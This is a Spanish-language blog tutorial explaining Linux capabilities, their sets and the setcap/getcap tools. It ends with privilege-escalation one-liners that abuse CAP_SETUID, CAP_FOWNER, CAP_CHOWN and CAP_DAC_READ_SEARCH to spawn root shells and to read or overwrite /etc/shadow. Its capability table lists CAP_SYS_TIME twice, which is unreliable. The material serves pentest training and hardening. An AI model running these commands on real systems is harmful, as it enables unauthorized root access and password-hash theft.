---
title: Explotación de las Capabilities
date: 2021-12-30 12:15:09 -0500
categories: [Privilege Escalation, Linux]
tags: [privesc,linux,capabilities]
image:
  path: https://i.ibb.co/Lt5fgcZ/explotacion-de-las-capabilities.png 
  alt: Explotación de las Capabilities 
---

Anteriormente, hablamos de los permisos SUID (setuid), te hago recordar esto porque quizás esto es algo parecido, pero no.

La diferencia entre estos es que si tenemos un binario con permisos SUID y ejecutas el binario, directamente asumes el rol del propietario de forma temporal. Pero si el binario tiene asignado una capabilitie, solo se le permite ejecutar ciertas acciones privilegiadas, más no asumir el rol del propietario.

## ¿Qué son las capabilities?

Las capabilities son atributos especiales en el kernel de Linux que otorgan privilegios específicos a procesos y programas que normalmente están reservados para procesos cuyo UID sea 0.

Lo bueno de las capabilities para un sysadmin es que con estas podemos dividir el poder de root, de modo que si se logra explotar un binario que tiene una o más capabilities, el daño que causara este será limitado, esto dependerá de las capabilities que le asignes.

## Capabilites Sets

Cada subproceso tiene los siguientes conjuntos de capabilities que contienen cero o más:

### CapInh: Inherited capabilities (Heredadas)
Con el Inherited (Heredado), se puede especificar todas las capabilities que se pueden heredar de un proceso principal.

### CapPrm: Permitted capabilities (Permitidas)

Este es un superconjunto de capabilities que el subproceso puede agregar a los conjuntos de subprocesos permitidos o heredables.

### CapEff: Effective capabilities (Efectivas)

El CapEff representa todas las capabilities que el proceso está usando en este momento (este es el conjunto real de capabilities que el kernel usa para las comprobaciones de permisos).

### CapBnd: Bounding capabilities (Delimitación)

Con el Bounding (Delimitador), es posible restringir las capabilities que un proceso puede recibir.

### CapAmb: Ambient capabilities (Ambientales)

La capabilitie Ambient (Ambientales) se aplica a todos los archivos binarios no SUID sin capabilities de archivo.

## ¿Cómo se usan?

Hay varias capabilities para diferentes propósitos, esta es una lista de las más relevantes:

| Capabilitie | Descripción |
|-|-|
| CAP_SYS_TIME | Configure el sistema y el reloj de hardware en tiempo real. |
| CAP_SYS_TIME | Evita comprobaciones de permisos para enviar señales. | 
| CAP_DAC_OVERRIDE | Evita las revisiones de permisos sobre operaciones de lectura, escritura y ejecución. |
| CAP_CHOWN | Permite cambios arbitrarios en los IDs de usuario y de grupo los ficheros. |
| CAP_NET_RAW | Permite el uso de conectores de tipo RAW y PACKET. | 

Se puede asignar una capabilitie/s de las siguientes formas:
- `setcap cap_setuid+ep /usr/bin/python3.9`
- `setcap cap_setuid,cap_chown+ep /usr/bin/python3.9`

Podemos comprobar que capabilities tiene asignado el subproceso actualmente con: `grep "Cap" /proc/<PID>/status`

-   Usuario **normal**: ![Capabilities - user](https://i.ibb.co/Ksvk45F/User.png)

-   Usuario **root**: ![Capabilities - root](https://i.ibb.co/7Rr4dzy/Root.png)

> **Nota:** El `$$` contiene el PID de la shell que estamos ejecutando.

Veremos números hexadecimales que con la utilidad `capsh`, podemos decodificarlos para obtener los nombres de las capabilities asignadas:

![capsh](https://i.ibb.co/0Z51R7V/capsh.png)

También hay otra manera más fácil con `getpcaps <PID>`.

![getpcaps](https://i.ibb.co/MPBDRRj/getpcaps.png)

- Encontrar capabilities asignadas de forma recursiva desde la raíz: `getcap -r / 2>/dev/null`
- Mostrar las capabilities asignadas en un archivo en específico: `getcap /usr/bin/python3.9`
- Podemos remover las capabilities asignadas a un archivo: `setcap -r /usr/bin/python3.9`

## Privilege Escalation

Existe una lista muy larga de las capabilities que existen hoy en día, pero hay algunas en específicas que si le asignas a determinados programas puedes escalar privilegios de forma completa y obtener un shell como usuario root.

> **Nota:** Estas capabilities solo fueron asignadas a `python3.9` para que se les sea fácil entender, pero que quede en claro que este no es el único comando que se puede explotar.

### CAP_SETUID

```terminal
python3.9 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

### CAP_FOWNER

```terminal
python3.9 -c 'import os; os.chmod("/bin/bash",40001)'
/bin/bash -p
```

### CAP_CHOWN

Podemos asignarnos como propietario del archivo `/etc/shadow`:

```terminal
python3.9 -c 'import os; os.chown("/etc/shadow",1000,1000)'
```

Si grepeamos por `ENCRYPT` en fichero `/etc/login.defs`, podemos ver que método de encriptado usa:

![login.defs](https://i.ibb.co/JykvKhN/login-defs.png)

para así generar una nueva contraseña con `openssl` y su encriptado correspondiente y remplazarlo para el usuario root. Puedes solicitar ayuda con `openssl passwd --help` para crear el tipo de hash para la contraseña.

Ejemplo: `openssl passwd -6`

### CAP_DAC_READ_SEARCH

Con esta capabilitie podemos leer cualquier archivo, en especial el `/etc/shadow` :

```terminal
python3.9 -c 'print(open("/etc/shadow","r").read())'
```

Estas solo fueron algunas, en la página de [GTFOBins](https://gtfobins.github.io/) puedes encontrar más comandos que puedes explotar con diferentes capabilities.

